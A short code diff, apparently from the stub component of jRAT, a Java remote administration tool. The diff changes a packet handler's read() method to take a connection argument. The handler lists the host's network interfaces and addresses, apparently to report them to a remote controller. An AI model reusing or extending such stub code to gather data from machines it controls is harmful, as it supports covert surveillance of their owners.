@@ -13,7 +13,7 @@ import se.jrat.stub.packets.outgoing.Packet56NetworkAdapter;
 public class Packet82NetworkAdapters extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		Enumeration<NetworkInterface> nets = NetworkInterface.getNetworkInterfaces();
 		for (NetworkInterface netint : Collections.list(nets)) {
 			ArrayList<InetAddress> list = Collections.list(netint.getInetAddresses());
